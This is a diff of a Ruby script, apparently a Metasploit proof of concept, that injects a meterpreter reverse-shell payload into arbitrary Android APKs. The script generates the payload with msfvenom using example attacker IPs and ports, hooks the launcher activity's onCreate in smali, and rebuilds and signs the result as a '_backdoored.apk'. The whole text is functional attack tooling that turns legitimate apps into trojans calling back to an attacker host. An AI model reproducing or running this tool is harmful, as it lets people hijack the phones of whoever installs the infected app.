@@ -1,48 +1,15 @@
 #!/usr/bin/env ruby
+#
+# This script is a POC for injecting metasploit payloads on 
+# arbitrary APKs. Latest Git version of Apktool is recommended.
+# Authored by timwr, Jack64
+#
+
 
 require 'nokogiri'
 require 'fileutils'
 
-apkfile = ARGV[0]
-unless(apkfile && File.readable?(apkfile))
-    puts "Usage: #{$0} /apk/to/backdoor.apk"
-    exit(1)
-end
-
-apktool = `which apktool`
-unless(apktool && apktool.length > 0)
-    puts "No apktool"
-    exit(1)
-end
-
-jarsigner = `which jarsigner`
-unless(jarsigner && jarsigner.length > 0)
-    puts "No jarsigner"
-    exit(1)
-end
-
-print "[*] Generating msfvenom payload..\n"
-`./msfvenom -f raw -p android/meterpreter/reverse_tcp LHOST=172.16.197.79 LPORT=4444 > payload.apk`
-
-print "[*] Signing payload..\n"
-`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey`
-
-`rm -rf original`
-`rm -rf payload`
-
-`cp #{apkfile} original.apk`
-
-print "[*] Decompiling orignal APK..\n"
-`apktool d original.apk`
-print "[*] Decompiling payload APK..\n"
-`apktool d payload.apk`
-
-f = File.open("original/AndroidManifest.xml")
-amanifest = Nokogiri::XML(f)
-f.close
-
 # Find the activity that is opened when you click the app icon
-print "[*] Locating onCreate() hook..\n"
 def findlauncheractivity(amanifest)
     package = amanifest.xpath("//manifest").first['package']
     activities = amanifest.xpath("//activity|//activity-alias")
@@ -104,6 +71,71 @@ def scrapeFilesForLauncherActivity()
 	return [smalifile,activitysmali]
 end
 
+apkfile = ARGV[0]
+unless(apkfile && File.readable?(apkfile))
+	puts "Usage: #{$0} [target.apk] [msfvenom options]\n"
+	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
+	exit(1)
+end
+
+jarsigner = `which jarsigner`
+unless(jarsigner && jarsigner.length > 0)
+	puts "No jarsigner"
+	exit(1)
+end
+
+apktool = `which apktool`
+unless(apktool && apktool.length > 0)
+	puts "No apktool"
+	exit(1)
+end
+
+apk_v=`apktool`
+unless(apk_v.split()[1].include?("v2."))
+	puts "[-] Apktool version #{apk_v} not supported, please download the latest 2. version from git.\n"
+	exit(1)
+end
+
+begin
+	msfvenom_opts = ARGV[1,ARGV.length]
+	opts=""
+	msfvenom_opts.each{|x|
+	opts+=x
+	opts+=" "
+	}
+rescue
+	puts "Usage: #{$0} [target.apk] [msfvenom options]\n"
+	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
+	puts "[-] Error parsing msfvenom options. Exiting.\n"
+	exit(1)
+end
+
+
+
+print "[*] Generating msfvenom payload..\n"
+res=`msfvenom -f raw #{opts} -o payload.apk 2>&1`
+if res.downcase.include?("invalid" || "error")
+	puts res
+	exit(1)
+end
+
+print "[*] Signing payload..\n"
+`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey`
+
+`cp #{apkfile} original.apk`
+
+print "[*] Decompiling orignal APK..\n"
+`apktool d $(pwd)/original.apk -o $(pwd)/original`
+print "[*] Decompiling payload APK..\n"
+`apktool d $(pwd)/payload.apk -o $(pwd)/payload`
+
+f = File.open("original/AndroidManifest.xml")
+amanifest = Nokogiri::XML(f)
+f.close
+
+print "[*] Locating onCreate() hook..\n"
+
+
 launcheractivity = findlauncheractivity(amanifest)
 smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
 begin
@@ -127,10 +159,14 @@ payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
 print "[*] Loading ",smalifile," and injecting payload..\n"
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
+injected_apk=apkfile.split(".")[0]
+injected_apk+="_backdoored.apk"
+print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
+`apktool b -o $(pwd)/#{injected_apk} $(pwd)/original`
+print "[*] Signing #{injected_apk} ..\n"
+`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey`
 
-print "[*] Rebuilding backdoor.apk ..\n"
-`apktool b -o backdoor.apk original`
-print "[*] Signing backdoor.apk ..\n"
-`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA backdoor.apk androiddebugkey`
-
-puts "[+] Created backdoor.apk with meterpreter payload\n"
+#CLEAN UP
+`rm -rf original`
+`rm -rf payload`
+puts "[+] Infected file #{injected_apk} ready.\n"
